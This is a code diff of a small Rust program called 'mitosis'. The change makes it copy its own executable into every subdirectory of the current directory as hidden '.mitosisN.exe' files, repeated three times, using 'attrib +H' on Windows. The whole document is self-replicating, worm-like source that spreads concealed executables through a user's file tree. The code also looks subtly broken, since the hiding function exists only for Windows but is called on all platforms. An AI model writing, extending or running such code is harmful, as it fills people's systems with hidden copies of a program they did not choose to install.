@@ -1,42 +1,49 @@
 use std::env;
 use std::fs;
 use std::path::Path;
+use std::io;
+use walkdir::WalkDir;
 
-
-fn mitosis(count: u32) -> std::io::Result<()> {
+fn mitosis(count: &mut u32, dir: &Path) -> io::Result<()> {
     let current = env::current_exe()?;
-    println!("{:?}", current);
 
-    let filename = format!(".mitosis{}.exe", count);
-    let copy = current.with_file_name(filename);
-    fs::copy(&current, &copy)?;
-
-    println!("new file made at {:?}", copy);
-
-    #[cfg(target_os = "windows")]
+    for entry in WalkDir::new(dir)
+        .into_iter()
+        .filter_map(Result::ok)
+        .filter(|e| e.file_type().is_dir())
     {
-        use std::process::Command;
-        let _ = Command::new("attrib")
-            .args(&["+H", copy.to_str().unwrap()])
-            .output()
-            .expect("Failed to set hidden attribute");
-        println!("Hidden attribute set on Windows.");
-    }
-/* 
-    Command::new(&copy)
-        .spawn()
-        .expect("Failed to run new copy");
+        let path = entry.path();
 
-*/
+        let filename = format!(".mitosis{}.exe", *count);
+        let copy_path = path.join(&filename);
+        fs::copy(&current, &copy_path)?;
+        set_hidden(&copy_path);
+
+        *count += 1;
+    }
+
     Ok(())
 }
 
+#[cfg(target_os = "windows")]
+fn set_hidden(path: &Path) {
+    use std::process::Command;
+    let _ = Command::new("attrib")
+        .args(&["+H", path.to_str().unwrap()])
+        .output()
+        .expect("Failed to set hidden attribute");
+}
+
+
 fn main() {
-    let mut count = 0;
-    while count < 3 {
-        count += 1;
-        if let Err(e) = mitosis(count) {
+    let start_dir = env::current_dir().expect("Failed to get current directory");
+    let mut count = 1;
+    let mut iterations = 0;
+
+    while iterations < 3 {
+        if let Err(e) = mitosis(&mut count, &start_dir) {
             println!("Error replicating: {}", e);
         }
+        iterations += 1;
     }
 }
